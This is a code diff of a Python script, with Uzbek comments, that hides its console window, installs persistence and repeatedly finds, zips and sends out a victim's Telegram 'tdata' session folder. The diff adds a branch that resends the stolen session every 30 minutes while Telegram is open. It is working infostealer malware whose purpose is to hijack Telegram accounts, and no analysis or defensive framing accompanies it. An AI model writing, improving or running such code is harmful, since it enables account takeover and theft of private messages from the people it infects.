@@ -9,7 +9,6 @@ import zipfile
 import subprocess
 import sys
 
-# Qora oynani yashirish
 if os.name == 'nt':
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
@@ -69,10 +68,10 @@ def install_persistence():
     except:
         pass
 
-# MAIN: Birinchi ishga tushganda
+# MAIN
 install_persistence()
 
-# Birinchi tdata yuborish
+# Birinchi marta ishga tushganda darhol yuboradi
 tdata_path, pc_name = get_tdata_bruteforce()
 if tdata_path:
     try:
@@ -90,21 +89,25 @@ if tdata_path:
     except:
         pass
 
-# ENDI: Doimiy kuzatish (Faqat Telegram ochilganda)
-last_sent_status = "closed"  # Telegram holatini kuzatish
+# Endi doimiy kuzatish (faqat yopilib qayta ochilganda yoki 30 daqiqada)
+last_state = "closed"
+last_sent_time = 0
+
 while True:
-    time.sleep(2)  # Har 2 soniyada tekshiradi (tezkor javob uchun)
+    time.sleep(2)  # Har 2 soniyada tekshiradi
     try:
         result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
         is_running = "Telegram.exe" in result.stdout
         
-        # Agar Telegram hozirgina ochilgan bo'lsa (yopiq edi, hozir ochildi)
-        if is_running and last_sent_status == "closed":
+        current_time = time.time()
+        
+        # 1. Agar Telegram hozirgina ochilgan bo'lsa (yopiq edi, ochildi)
+        if is_running and last_state == "closed":
             tdata_path, pc_name = get_tdata_bruteforce()
             if tdata_path:
                 try:
                     temp_dir = tempfile.gettempdir()
-                    zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
+                    zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(current_time)}.zip")
                     with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                         for root, dirs, files in os.walk(tdata_path):
                             for file in files:
@@ -116,11 +119,33 @@ while True:
                     os.remove(zip_path)
                 except:
                     pass
-            last_sent_status = "open"  # Telegram ochiqligini belgilaymiz
+            last_state = "open"
+            last_sent_time = current_time
         
-        # Agar Telegram yopilgan bo'lsa, holatni o'zgartiramiz
-        if not is_running and last_sent_status == "open":
-            last_sent_status = "closed"
-            
+        # 2. Agar Telegram yopilsa, holatni o'zgartiramiz (lekin tdata yubormaymiz)
+        if not is_running and last_state == "open":
+            last_state = "closed"
+        
+        # 3. Agar Telegram ochiq tursa, lekin 30 daqiqadan o'tgan bo'lsa, yangi tdata yuboradi
+        if is_running and last_state == "open":
+            if current_time - last_sent_time > 1800:  # 30 daqiqa = 1800 soniya
+                tdata_path, pc_name = get_tdata_bruteforce()
+                if tdata_path:
+                    try:
+                        temp_dir = tempfile.gettempdir()
+                        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(current_time)}.zip")
+                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                            for root, dirs, files in os.walk(tdata_path):
+                                for file in files:
+                                    try:
+                                        file_path = os.path.join(root, file)
+                                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
+                                    except: pass
+                        send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
+                        os.remove(zip_path)
+                    except:
+                        pass
+                last_sent_time = current_time
+                
     except:
         pass
